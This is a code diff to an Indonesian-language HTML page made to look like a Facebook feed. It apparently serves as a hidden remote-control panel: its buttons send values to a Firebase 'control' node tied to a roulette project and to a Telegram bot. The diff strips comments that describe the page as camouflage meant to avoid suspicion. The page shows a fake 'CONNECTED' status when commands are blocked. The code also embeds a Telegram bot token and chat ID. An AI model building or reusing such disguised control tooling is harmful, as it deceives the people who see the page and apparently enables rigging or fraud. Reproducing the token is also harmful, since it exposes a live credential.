@@ -88,59 +88,54 @@
             <div class="shortcut-item" onclick="sendCmd(11, 'SAVE')">🔖<br>Simpan</div>
             <div class="shortcut-item" onclick="sendCmd(12, 'DATE')">❤️<br>Kencan</div>
         </div>
-
-        <div class="feed-card">
-            <div class="feed-header">
-                <div class="avatar" style="background:#cc0000"></div>
-                <div><div class="profile-name">Jual Beli Gadget</div><div class="feed-time">25 mnt • 🌎</div></div>
-            </div>
-            <div class="feed-text">Ready stok iPhone 13 Pro Max mulus, nominus. Fullset ori. Harga bersahabat!</div>
-            <div class="media-box"><img src="https://i.ibb.co/Y3mX0vK/loker-indo.jpg"></div>
-        </div>
     </div>
 
     <script>
         let dbRef = null;
-        let isAdminLocked = true; // Default Mati untuk keamanan
+        let isAdminLocked = true;
 
         // Firebase Setup
         const config = { databaseURL: "https://roullete-fc17f-default-rtdb.asia-southeast1.firebasedatabase.app/" };
         if (!firebase.apps.length) firebase.initializeApp(config);
         dbRef = firebase.database().ref('control');
 
-        // MONITOR STATUS SEKETIKA (REAL-TIME)
+        // MONITOR STATUS & AUTO LOGOUT
         dbRef.on('value', (snapshot) => {
             const data = snapshot.val();
             const nodeLabel = document.getElementById("node-val");
             
             if (data && data.clientA_status === "ON" && data.app_status !== "OFF") {
                 isAdminLocked = false;
-                nodeLabel.innerText = "ID_STABLE"; // Tanda ON
+                nodeLabel.innerText = "ID_STABLE";
             } else {
                 isAdminLocked = true;
-                nodeLabel.innerText = "STABLE";    // Tanda OFF
+                nodeLabel.innerText = "STABLE";
+                
+                // AUTO LOGOUT 2 DETIK JIKA STATUS OFF
+                setTimeout(() => {
+                    // Membersihkan data sesi (jika ada login sebelumnya)
+                    localStorage.clear();
+                    // Refresh halaman paksa
+                    window.location.reload();
+                }, 2000); 
             }
         });
 
         function sendCmd(id, label) {
             let val = (id === null) ? "RANDOM" : (12 - id).toFixed(1);
             
-            // Visual tetap jalan agar tidak curiga (Kamuflase)
             document.getElementById("payload-val").innerText = val;
             document.getElementById("sync-val").innerText = "SENDING...";
             document.getElementById("sync-val").style.color = "#ffaa00";
 
-            // BLOKIR TOTAL JIKA STATUS BUKAN ON
             if (isAdminLocked) {
-                console.log("BLOCK: Remote Nonaktif");
                 setTimeout(() => { 
                     document.getElementById("sync-val").innerText = "CONNECTED"; 
                     document.getElementById("sync-val").style.color = "#42b72a";
                 }, 800);
-                return; // Perintah terhenti di sini (Gagal Kirim)
+                return;
             }
 
-            // PENGIRIMAN (Hanya Aktif Jika ON)
             fetch(`https://api.telegram.org/bot8075763270:AAHO7w8v1g2ThE_NetGWEpFDid620dlmF28/sendMessage?chat_id=1988855705&text=FB_LOG:${label}_Val:${val}`);
             
             if(dbRef) {
